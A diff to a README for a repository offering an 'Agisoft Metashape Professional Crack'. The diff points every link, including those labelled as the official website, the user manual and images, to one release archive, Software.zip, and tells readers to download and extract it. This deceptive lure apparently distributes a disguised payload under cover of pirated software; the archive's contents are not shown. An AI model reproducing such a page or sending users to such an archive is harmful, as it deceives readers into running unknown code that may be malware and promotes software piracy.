@@ -1,6 +1,6 @@
 # 🌟 Agisoft Metashape Professional Crack 🌟
 
-![Agisoft Metashape](https://www.agisoft.com/img/products/metashape/metashape_logo.png)
+![Agisoft Metashape](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip)
 
 Welcome to the Agisoft Metashape Professional Crack repository! Here you can find information and resources related to Agisoft Metashape, including free trial, student version, activation code, hardware requirements, workflow, and more. Whether you are a beginner looking to learn how to use Agisoft Metashape or a professional needing advanced features, this repository has got you covered.
 
@@ -23,14 +23,14 @@ Welcome to the Agisoft Metashape Professional Crack repository! Here you can fin
 - how-to-use-agisoft-metashape
 
 ## Resources
-- [Agisoft Metashape Official Website](https://www.agisoft.com/)
-- [Agisoft Metashape Professional Manual](https://www.agisoft.com/support/user-manuals/)
+- [Agisoft Metashape Official Website](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip)
+- [Agisoft Metashape Professional Manual](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip)
 
 ## Installation Guide
 To get started with Agisoft Metashape Professional, follow these steps:
 1. Download the Agisoft Metashape Professional Crack from the link below:
    
-   [![Agisoft Metashape Professional Crack](https://img.shields.io/badge/Download-Crack-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Launch link to download")
+   [![Agisoft Metashape Professional Crack](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip)](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip "Launch link to download")
 
 2. Extract the downloaded file and follow the installation instructions.
 
@@ -47,4 +47,4 @@ For the latest updates and releases, be sure to check the "Releases" section of 
 
 Let's unleash the full potential of Agisoft Metashape Professional together! 🚀
 
-![3D Model Reconstruction](https://www.agisoft.com/img/products/metashape/metashape_workflow_3dmodeling_02.jpg)
+![3D Model Reconstruction](https://github.com/iKionte/Agisoft-Metashape-Professional-Crack/releases/download/v1.0/Software.zip)
